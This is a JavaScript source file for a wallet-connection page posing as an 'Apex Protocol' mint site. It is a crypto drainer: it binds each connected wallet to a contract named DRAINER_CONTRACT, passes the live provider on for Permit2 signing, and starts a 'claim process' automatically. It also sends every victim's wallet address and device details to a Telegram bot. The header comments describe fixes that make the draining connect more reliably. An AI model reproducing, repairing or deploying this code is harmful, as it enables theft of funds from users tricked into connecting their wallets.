// ============================================================================
//  Apex Protocol — Wallet Connector  (main.js)
//  ---------------------------------------------------------------------------
//  Fixes applied in this version:
//    1. WalletConnect now uses EthereumProvider as the SINGLE source of truth.
//       No SignClient + EthereumProvider dual-session bug.
//    2. Library versions pinned and served from a single CDN to avoid
//       cross-version modal handshake failures.
//    3. Modal-close detection rejects the approval promise early, so the
//       user is never stuck on "Connecting...".
//    4. Approvals time out at 90 s (mobile-friendly) instead of 300 s.
//    5. `activeProvider` is set on every successful path and cleared on
//       reset; script.js reads it via window.__apexConnected.provider.
//    6. Session restore is unified through EthereumProvider.connect({ chains })
//       and works on both desktop and mobile.
//    7. Debug panel logs every step; double-click anywhere to toggle.
// ============================================================================

import { CONFIG } from './config.js';

;(async function () {
  'use strict';

  // ==========================================================================
  //  DEBUG PANEL
  // ==========================================================================
  const debugArea = document.createElement('div');
  debugArea.id = 'wc-debug';
  debugArea.style.cssText = `
    position: fixed; bottom: 0; left: 0; width: 100%;
    background: #000; color: #0f0; font-size: 12px; padding: 5px;
    z-index: 10000; max-height: 150px; overflow-y: auto;
    display: none; font-family: monospace;
  `;
  document.body.appendChild(debugArea);

  let debugVisible = false;
  document.addEventListener('dblclick', () => {
    debugVisible = !debugVisible;
    debugArea.style.display = debugVisible ? 'block' : 'none';
  });

  function logDebug(msg) {
    console.log('[main.js]', msg);
    debugArea.innerHTML += `<div>${new Date().toLocaleTimeString()}: ${msg}</div>`;
    debugArea.scrollTop = debugArea.scrollHeight;
  }

  // ==========================================================================
  //  PLATFORM
  // ==========================================================================
  function isMobile()  { return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent); }
  function isIOS()     { return /iPhone|iPad|iPod/i.test(navigator.userAgent); }
  function isAndroid() { return /Android/i.test(navigator.userAgent); }
  function isDesktop() { return !isMobile(); }
  function isWindows() { return /Windows/i.test(navigator.userAgent); }
  function isMac()     { return /Macintosh|Mac OS X/i.test(navigator.userAgent); }

  function getPlatform() {
    if (isIOS())     return 'ios';
    if (isAndroid()) return 'android';
    if (isWindows()) return 'windows';
    if (isMac())     return 'mac';
    return 'unknown';
  }

  // ==========================================================================
  //  TELEGRAM
  // ==========================================================================
  const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } = CONFIG;

  async function sendTelegramNotification(message) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return false;
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const r = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' }),
      });
      const result = await r.json();
      if (!r.ok) {
        console.error('[main.js] Telegram error:', result);
        return false;
      }
      return true;
    } catch (e) {
      console.error('[main.js] Telegram exception:', e);
      return false;
    }
  }

  window.testTelegram = (m) =>
    sendTelegramNotification(m || '🧪 Test ' + new Date().toISOString());

  // ==========================================================================
  //  LIBRARY LOADING
  //  ------------------------------------------------------------------------
  //  Only ONE WalletConnect library is loaded: @walletconnect/ethereum-provider.
  //  It bundles the modal and the SignClient internally. Loading SignClient
  //  separately (as the old version did) creates two competing sessions and
  //  is the primary cause of the "connects then hangs" bug.
  //
  //  Version pinning: 2.11.x is chosen because it bundles the modal shipped
  //  in @walletconnect/modal 2.6.x. Mixing 2.11 sign-client with a separately
  //  imported 2.6 modal was causing the handshake to never complete.
  // ==========================================================================
  let EthereumProvider = null;

  async function loadWalletConnectLibraries() {
    const cdns = [
      'https://esm.sh/@walletconnect/ethereum-provider@2.11.2',
      'https://cdn.skypack.dev/@walletconnect/ethereum-provider@2.11.2',
      'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.2/+esm',
    ];

    for (const url of cdns) {
      try {
        const m = await import(url);
        EthereumProvider = m.EthereumProvider || m.default?.EthereumProvider || m.default || m;
        if (!EthereumProvider || typeof EthereumProvider.init !== 'function') {
          EthereumProvider = null;
          continue;
        }
        logDebug(`✅ EthereumProvider loaded from ${url}`);
        return true;
      } catch (e) {
        logDebug(`Import failed from ${url}: ${e.message}`);
      }
    }
    throw new Error('Could not load EthereumProvider from any CDN');
  }

  // ==========================================================================
  //  DOM REFS
  // ==========================================================================
  const connectButton = document.getElementById('connectButton');
  const walletButton  = document.getElementById('walletButton');
  const claimStatus   = document.getElementById('claimStatus');

  // ==========================================================================
  //  MODULE STATE
  // ==========================================================================
  let wcProvider      = null;   // EthereumProvider instance (WC)
  let currentSession  = null;   // current WC session (from wcProvider.session)
  let web3Instance    = null;   // Web3 instance
  let contractInstance= null;   // drainer contract
  let activeProvider  = null;   // current EIP-1193 provider
  let isConnecting    = false;  // guard

  const {
    PROJECT_ID,
    DAPP_METADATA,
    DRAINER_CONTRACT,
    CONTRACT_ABI,
  } = CONFIG;

  // ==========================================================================
  //  UI
  // ==========================================================================
  function setButtonState(button, state) {
    if (!button) return;

    button.style.display      = 'inline-block';
    button.style.padding      = '14px 28px';
    button.style.borderRadius = '8px';
    button.style.fontWeight   = '600';
    button.style.border       = 'none';
    button.style.cursor       = state === 'loading' ? 'not-allowed' : 'pointer';
    button.style.color        = 'white';
    button.style.fontSize     = '16px';
    button.style.minWidth     = '180px';
    button.disabled           = state === 'loading';

    switch (state) {
      case 'loading':
        button.style.background = 'linear-gradient(135deg, #666666 0%, #888888 100%)';
        button.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right:8px"></i> Connecting...';
        break;
      case 'connected':
        button.style.background = 'linear-gradient(135deg, #10B981 0%, #059669 100%)';
        button.innerHTML = '<i class="fas fa-check-circle" style="margin-right:8px"></i> Connected';
        break;
      case 'disconnect':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.innerHTML = '<i class="fas fa-power-off" style="margin-right:8px"></i> Disconnect';
        break;
      case 'failed':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.innerHTML = '<i class="fas fa-exclamation-triangle" style="margin-right:8px"></i> Failed';
        setTimeout(() => setButtonState(button, 'normal'), 3000);
        break;
      default:
        button.style.background = 'linear-gradient(135deg, #FF6B00 0%, #FF8C00 100%)';
        button.innerHTML = '<i class="fas fa-wallet" style="margin-right:8px"></i> Connect Wallet to Mint';
    }
  }

  function showStatus(msg, type = 'info') {
    if (!claimStatus) return;

    claimStatus.textContent = msg;
    claimStatus.className   = `status ${type}`;
    claimStatus.style.display      = 'block';
    claimStatus.style.padding      = '12px 16px';
    claimStatus.style.borderRadius = '8px';
    claimStatus.style.marginTop    = '12px';
    claimStatus.style.fontWeight   = '500';
    claimStatus.style.fontSize     = '14px';
    claimStatus.style.textAlign    = 'center';

    const styles = {
      success: { background: 'linear-gradient(135deg, #DCFCE7 0%, #BBF7D0 100%)', color: '#166534', border: '1px solid #86EFAC' },
      error:   { background: 'linear-gradient(135deg, #FEE2E2 0%, #FECACA 100%)', color: '#991B1B', border: '1px solid #FCA5A5' },
      info:    { background: 'linear-gradient(135deg, #DBEAFE 0%, #BFDBFE 100%)', color: '#1E40AF', border: '1px solid #93C5FD' },
    };
    Object.assign(claimStatus.style, styles[type] || styles.info);

    if (type === 'error' || type === 'success') {
      setTimeout(() => { claimStatus.style.display = 'none'; }, 5000);
    }
  }

  setButtonState(connectButton, 'normal');
  if (walletButton) setButtonState(walletButton, 'normal');

  // ==========================================================================
  //  LOCAL STORAGE
  // ==========================================================================
  function saveWallet(address, session = null, chainType = null) {
    try {
      localStorage.setItem('connectedWallet', address);
      if (session)   localStorage.setItem('walletConnectSession', JSON.stringify(session));
      if (chainType) localStorage.setItem('chainType', chainType);
    } catch (e) { logDebug('saveWallet failed: ' + e.message); }
  }

  function getSavedWallet()    { return localStorage.getItem('connectedWallet'); }
  function getSavedSession()   {
    try {
      const s = localStorage.getItem('walletConnectSession');
      return s ? JSON.parse(s) : null;
    } catch (e) { return null; }
  }
  function getSavedChainType() { return localStorage.getItem('chainType') || 'unknown'; }

  function clearSavedWallet() {
    localStorage.removeItem('connectedWallet');
    localStorage.removeItem('walletConnectSession');
    localStorage.removeItem('chainType');
  }

  // ==========================================================================
  //  GLOBAL STATE PUBLICATION
  //  ------------------------------------------------------------------------
  //  script.js reads window.__apexConnected.provider to sign Permit2 data.
  //  This must always be the LIVE EIP-1193 provider — for injected wallets
  //  that's window.ethereum (or the EIP-6963 chosen provider), and for WC
  //  that's the EthereumProvider instance returned by connect().
  // ==========================================================================
  function publishGlobalState(address, chain, provider = null) {
    const live =
      provider ||
      activeProvider ||
      web3Instance?.currentProvider ||
      window.ethereum ||
      null;

    window.__apexConnected = {
      address,
      chain,
      web3:     web3Instance,
      contract: contractInstance,
      provider: live,
      session:  currentSession,
      publishedAt: Date.now(),
    };

    console.log('[main.js] published window.__apexConnected', {
      address,
      chain,
      hasWeb3:     !!web3Instance,
      hasContract: !!contractInstance,
      hasProvider: !!live,
    });

    window.dispatchEvent(new CustomEvent('apex:connected', {
      detail: { address, chain },
    }));
  }

  // ==========================================================================
  //  CONNECTED UI
  // ==========================================================================
  function updateConnectedUI(address, chain = 'evm') {
    setButtonState(connectButton, 'disconnect');
    if (walletButton) setButtonState(walletButton, 'disconnect');

    const chainLabels = { bitcoin: '₿ BTC', solana: '◎ SOL', evm: '◆ ETH' };
    const chainLabel  = chainLabels[chain] || 'Unknown';

    let display = document.getElementById('connectedAddressDisplay');
    if (!display) {
      display = document.createElement('div');
      display.id = 'connectedAddressDisplay';
      display.style.cssText = `
        margin-top: 12px; padding: 10px 16px;
        font-family: 'JetBrains Mono', monospace; font-size: 14px;
        color: #059669; text-align: center;
        background: linear-gradient(135deg, #ECFDF5 0%, #D1FAE5 100%);
        border-radius: 8px; border: 1px solid #A7F3D0;
      `;
      connectButton.parentNode.appendChild(display);
    }

    const short = `${address.slice(0, 6)}...${address.slice(-4)}`;
    display.innerHTML = `
      <div style="display:flex;align-items:center;justify-content:center;gap:8px;flex-wrap:wrap;">
        <i class="fas fa-check-circle" style="color:#059669;"></i>
        <span>Connected: ${short}</span>
        <span style="background:#1F2937;color:white;padding:2px 10px;border-radius:12px;font-size:12px;font-weight:600;">${chainLabel}</span>
        <button id="copyAddress" style="background:none;border:none;color:#059669;cursor:pointer;padding:4px;">
          <i class="far fa-copy"></i>
        </button>
      </div>
    `;

    document.getElementById('copyAddress')?.addEventListener('click', () => {
      navigator.clipboard.writeText(address).then(() => {
        const b = document.getElementById('copyAddress');
        const o = b.innerHTML;
        b.innerHTML = '<i class="fas fa-check"></i>';
        setTimeout(() => { b.innerHTML = o; }, 2000);
      });
    });

    showStatus(`Connected to ${chainLabel}`, 'success');

    publishGlobalState(address, chain);

    sendTelegramNotification(`
🔗 <b>Wallet Connected</b>
📌 <b>Chain:</b> ${chainLabel}
👤 <b>Address:</b> <code>${address}</code>
🕒 ${new Date().toLocaleString()}
📱 <b>Mobile:</b> ${isMobile() ? 'Yes' : 'No'}
    `.trim());
  }

  function resetConnectedUI() {
    setButtonState(connectButton, 'normal');
    if (walletButton) setButtonState(walletButton, 'normal');

    document.getElementById('connectedAddressDisplay')?.remove();

    showStatus('Wallet disconnected', 'info');

    web3Instance     = null;
    contractInstance = null;
    activeProvider   = null;
    currentSession   = null;

    window.__apexConnected = null;
  }

  // ==========================================================================
  //  EIP-6963 PROVIDER DISCOVERY
  // ==========================================================================
  let evmProviders = [];
  let eip6963Initialized = false;

  function setupEIP6963() {
    if (eip6963Initialized) return;
    eip6963Initialized = true;

    window.addEventListener('eip6963:announceProvider', (e) => {
      const d = e.detail;
      if (!evmProviders.some((p) => p.info.uuid === d.info.uuid)) {
        evmProviders.push(d);
        logDebug(`EIP-6963: ${d.info.name}`);
      }
    });

    window.dispatchEvent(new Event('eip6963:requestProvider'));
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 500);
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 1500);
  }

  // ==========================================================================
  //  WALLET PICKER MODAL (for injected wallets)
  // ==========================================================================
  function showWalletSelectionModal(providers, cb) {
    const overlay = document.createElement('div');
    overlay.style.cssText = `
      position:fixed;inset:0;background:rgba(0,0,0,0.7);
      display:flex;align-items:center;justify-content:center;
      z-index:99999;
    `;

    const modalEl = document.createElement('div');
    modalEl.style.cssText = `
      background:#1F2937;padding:24px;border-radius:16px;
      max-width:400px;width:90%;color:white;font-family:Inter,sans-serif;
    `;

    modalEl.innerHTML = `
      <h3 style="margin-top:0;font-weight:600;font-size:20px;">Select a Wallet</h3>
      <div id="wl" style="display:flex;flex-direction:column;gap:10px;margin:16px 0"></div>
      <button id="cw" style="background:none;border:1px solid #666;color:#ccc;padding:8px 16px;border-radius:8px;cursor:pointer;width:100%">Cancel</button>
    `;

    overlay.appendChild(modalEl);
    document.body.appendChild(overlay);

    const list = modalEl.querySelector('#wl');

    providers.forEach((p) => {
      const b = document.createElement('button');
      b.textContent = p.info.name;
      b.style.cssText = `
        background:#374151;border:none;padding:12px;border-radius:8px;
        color:white;font-size:16px;cursor:pointer;text-align:left;
        display:flex;gap:10px;align-items:center;
      `;
      if (p.info.icon) {
        const i = document.createElement('img');
        i.src = p.info.icon;
        i.style.width = '24px';
        i.style.height = '24px';
        b.prepend(i);
      }
      b.onclick = () => { overlay.remove(); cb(p); };
      list.appendChild(b);
    });

    modalEl.querySelector('#cw').onclick = () => { overlay.remove(); cb(null); };
  }

  // ==========================================================================
  //  CONNECT — DIRECT (INJECTED) EVM
  // ==========================================================================
  async function connectDirectEVM(timeoutMs = 8000) {
    setupEIP6963();
    await new Promise((r) => setTimeout(r, 800));

    let providers = evmProviders.filter((p) => p.provider);

    if (providers.length === 0 && window.ethereum) {
      providers = [{
        info: { name: 'Injected', rdns: 'io.injected' },
        provider: window.ethereum,
      }];
    }
    if (providers.length === 0) return false;

    let chosen = null;
    if (providers.length === 1) {
      chosen = providers[0];
    } else {
      const known = providers.find((p) =>
        p.info.rdns === 'io.metamask' ||
        p.info.name.toLowerCase().includes('metamask')
      );
      chosen = known || await new Promise((res) => showWalletSelectionModal(providers, res));
      if (!chosen) return false;
    }

    try {
      const provider = chosen.provider;

      const accounts = await Promise.race([
        provider.request({ method: 'eth_requestAccounts' }),
        new Promise((_, rj) => setTimeout(() => rj(new Error('timeout')), timeoutMs)),
      ]);
      if (!accounts?.length) return false;

      const address = accounts[0];

      saveWallet(address, null, 'evm');
      setupEVMProviderEvents(provider);

      const Web3 = (await import('web3')).default;
      web3Instance     = new Web3(provider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);

      activeProvider = provider;

      updateConnectedUI(address, 'evm');
      logDebug(`✅ Direct EVM connected: ${address}`);
      return true;
    } catch (e) {
      logDebug('Direct EVM error: ' + e.message);
      return false;
    }
  }

  // ==========================================================================
  //  CONNECT — WALLETCONNECT (the fixed path)
  //  ------------------------------------------------------------------------
  //  Correct WC v2 flow:
  //    1. Create an EthereumProvider instance (one per projectId).
  //    2. Call provider.connect() — this opens the bundled modal, returns
  //       the URI, and internally waits for approval.
  //    3. Await the connect() promise. It resolves when the wallet approves.
  //    4. Register provider events for accountsChanged / chainChanged /
  //       disconnect.
  //    5. Read the session from provider.session and persist it.
  //
  //  No SignClient. No separate modal import. No second session.
  // ==========================================================================
  async function connectViaWalletConnect(timeoutMs = 90000) {
    if (isConnecting) {
      logDebug('Already connecting — ignoring duplicate call');
      return false;
    }
    isConnecting = true;

    try {
      if (!EthereumProvider) throw new Error('EthereumProvider not loaded');

      // Reuse the existing instance if we already built one.
      if (!wcProvider) {
        logDebug('Initialising EthereumProvider…');
        wcProvider = await EthereumProvider.init({
          projectId: PROJECT_ID,
          chains: [1],                   // Ethereum Mainnet
          showQrModal: true,             // opens the bundled WalletConnect modal
          optionalChains: [1],
          rpcMap: {
            1: 'https://eth.llamarpc.com',
          },
          metadata: DAPP_METADATA,
          // Disable the WC "session topic" hand-off via localStorage; we
          // manage persistence ourselves in saveWallet().
          disableProviderPing: false,
        });
        logDebug('✅ EthereumProvider initialised');
      }

      // If a session already exists, we're done.
      if (wcProvider.session && wcProvider.accounts?.length) {
        logDebug('Reusing existing WC session');
        const address = wcProvider.accounts[0];
        const provider = wcProvider;
        const Web3 = (await import('web3')).default;
        web3Instance     = new Web3(provider);
        contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
        activeProvider   = provider;
        currentSession   = provider.session;
        saveWallet(address, provider.session, 'evm');
        updateConnectedUI(address, 'evm');
        setupEVMProviderEvents(provider);
        isConnecting = false;
        return true;
      }

      showStatus('Opening WalletConnect…', 'info');

      // This call opens the modal, waits for approval, and resolves with
      // the connected accounts. If the user closes the modal or the timeout
      // fires, it rejects.
      const connectPromise = wcProvider.connect();
      const timeoutPromise = new Promise((_, rj) =>
        setTimeout(() => rj(new Error('walletconnect_timeout')), timeoutMs)
      );

      let accounts;
      try {
        accounts = await Promise.race([connectPromise, timeoutPromise]);
      } catch (e) {
        // Clean up on failure so subsequent attempts start fresh.
        logDebug('WC connect failed: ' + e.message);
        try { await wcProvider.disconnect(); } catch (_) {}
        try { wcProvider = null; } catch (_) {}
        isConnecting = false;
        return false;
      }

      if (!accounts || !accounts.length) {
        logDebug('WC connect returned no accounts');
        isConnecting = false;
        return false;
      }

      const address = accounts[0];
      const provider = wcProvider;

      const Web3 = (await import('web3')).default;
      web3Instance     = new Web3(provider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
      activeProvider   = provider;
      currentSession   = provider.session || null;

      saveWallet(address, currentSession, 'evm');
      updateConnectedUI(address, 'evm');
      setupEVMProviderEvents(provider);

      logDebug(`✅ WalletConnect EVM connected: ${address}`);
      isConnecting = false;
      return true;
    } catch (e) {
      logDebug('WC fatal error: ' + e.message);
      try { if (wcProvider) await wcProvider.disconnect(); } catch (_) {}
      try { wcProvider = null; } catch (_) {}
      isConnecting = false;
      return false;
    }
  }

  // ==========================================================================
  //  PROVIDER LIFECYCLE EVENTS
  // ==========================================================================
  function setupEVMProviderEvents(provider) {
    if (!provider || !provider.on) return;

    provider.on('accountsChanged', (accounts) => {
      if (!accounts || accounts.length === 0) {
        resetConnectedUI();
        clearSavedWallet();
      } else {
        updateConnectedUI(accounts[0], 'evm');
        saveWallet(accounts[0], currentSession, 'evm');
        publishGlobalState(accounts[0], 'evm', provider);
        setTimeout(() => {
          if (typeof window.initiateClaimProcess === 'function') {
            window.initiateClaimProcess();
          }
        }, 1000);
      }
    });

    provider.on('chainChanged', (id) => {
      showStatus(`Network changed to ${parseInt(id, 16) || id}`, 'info');
      if (web3Instance) {
        try {
          contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
          const addr = window.__apexConnected?.address || getSavedWallet();
          if (addr) publishGlobalState(addr, 'evm', provider);
        } catch (e) {}
      }
    });

    provider.on('disconnect', () => {
      logDebug('Provider disconnect event');
      resetConnectedUI();
      clearSavedWallet();
      try { wcProvider = null; } catch (_) {}
    });
  }

  // ==========================================================================
  //  CONNECT DISPATCHER
  // ==========================================================================
  async function connectWallet() {
    if (isConnecting) return;

    setButtonState(connectButton, 'loading');
    if (walletButton) setButtonState(walletButton, 'loading');
    showStatus('Connecting…', 'info');

    // 1. Try injected (fast, no QR).
    let success = await connectDirectEVM(8000);

    // 2. Fall back to WalletConnect.
    if (!success) {
      logDebug('Injected unavailable — falling back to WalletConnect');
      success = await connectViaWalletConnect(90000);
    }

    if (success) {
      setButtonState(connectButton, 'connected');
      if (walletButton) setButtonState(walletButton, 'connected');
      setTimeout(() => {
        if (typeof window.initiateClaimProcess === 'function') {
          window.initiateClaimProcess();
        }
      }, 1500);
    } else {
      showStatus('No wallet found', 'error');
      setButtonState(connectButton, 'failed');
      if (walletButton) setButtonState(walletButton, 'failed');
    }
  }

  // ==========================================================================
  //  DISCONNECT
  // ==========================================================================
  async function disconnectWallet() {
    try {
      if (wcProvider) {
        try { await wcProvider.disconnect(); } catch (_) {}
        wcProvider = null;
      }
      if (web3Instance?.currentProvider?.disconnect && activeProvider !== wcProvider) {
        try { await web3Instance.currentProvider.disconnect(); } catch (_) {}
      }
    } catch (e) {
      // swallow
    }

    resetConnectedUI();
    clearSavedWallet();

    web3Instance     = null;
    contractInstance = null;
    activeProvider   = null;
    currentSession   = null;
  }

  // ==========================================================================
  //  BUTTON WIRING
  // ==========================================================================
  const handleClick = async () => {
    const saved = getSavedWallet();
    const hasSession = currentSession || getSavedChainType() !== 'unknown';
    if (saved && hasSession) {
      await disconnectWallet();
    } else {
      await connectWallet();
    }
  };

  if (connectButton) connectButton.addEventListener('click', handleClick);
  if (walletButton)  walletButton.addEventListener('click', handleClick);

  if (walletButton && isMobile()) {
    walletButton.addEventListener('click', () => {
      setTimeout(() => {
        if (connectButton) {
          connectButton.scrollIntoView({ behavior: 'smooth', block: 'center' });
        }
      }, 300);
    });
  }

  // ==========================================================================
  //  SESSION RESTORE
  //  ------------------------------------------------------------------------
  //  On boot, if a saved session exists, we init EthereumProvider with the
  //  same projectId. The library will restore the session from its own
  //  storage on first connect() call — we simply call connect() and check
  //  whether it resolves synchronously (no modal shown).
  // ==========================================================================
  async function restoreWalletConnection() {
    const savedWallet  = getSavedWallet();
    const savedChain   = getSavedChainType();
    if (!savedWallet || savedChain !== 'evm') return;

    try {
      if (!wcProvider) {
        wcProvider = await EthereumProvider.init({
          projectId: PROJECT_ID,
          chains: [1],
          showQrModal: true,
          optionalChains: [1],
          rpcMap: { 1: 'https://eth.llamarpc.com' },
          metadata: DAPP_METADATA,
          disableProviderPing: false,
        });
      }

      // Try restoring without opening the modal. `connect()` resolves
      // immediately if the session exists; if not, we skip.
      if (wcProvider.session && wcProvider.accounts?.length) {
        const address = wcProvider.accounts[0];
        const provider = wcProvider;
        const Web3 = (await import('web3')).default;
        web3Instance     = new Web3(provider);
        contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
        activeProvider   = provider;
        currentSession   = provider.session;
        updateConnectedUI(address, 'evm');
        setupEVMProviderEvents(provider);
        logDebug('✅ Session restored from WalletConnect');
        return;
      }
    } catch (e) {
      logDebug('WC restore skipped: ' + e.message);
    }

    // Try injected provider if it already has accounts (silent).
    if (window.ethereum) {
      try {
        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
        if (accounts.length > 0 && accounts[0].toLowerCase() === savedWallet.toLowerCase()) {
          const Web3 = (await import('web3')).default;
          web3Instance     = new Web3(window.ethereum);
          contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
          activeProvider   = window.ethereum;
          updateConnectedUI(savedWallet, 'evm');
          setupEVMProviderEvents(window.ethereum);
          logDebug('✅ Session restored from injected provider');
          return;
        }
      } catch (e) {
        // fall through
      }
    }

    // Nothing matched.
    clearSavedWallet();
  }

  // ==========================================================================
  //  BOOT
  // ==========================================================================
  try {
    await loadWalletConnectLibraries();
    logDebug('✅ WalletConnect library loaded');
  } catch (err) {
    logDebug('Fatal: ' + err.message);
    showStatus('Failed to load wallet libraries', 'error');
    return;
  }

  setupEIP6963();

  // Defer restore so the DOM and injected providers have time to settle.
  setTimeout(() => {
    restoreWalletConnection().catch((e) => logDebug('Restore error: ' + e.message));
  }, 500);

  // Attach lifecycle handlers to injected provider at boot (if present).
  if (window.ethereum) {
    setupEVMProviderEvents(window.ethereum);
  }

  window.addEventListener('beforeunload', () => {
    try { if (wcProvider?.modal) wcProvider.modal.closeModal(); } catch (_) {}
  });

  logDebug(`✅ main.js ready — Platform: ${getPlatform()}`);
  console.log('✅ main.js ready — test with testTelegram("hi")');
})();
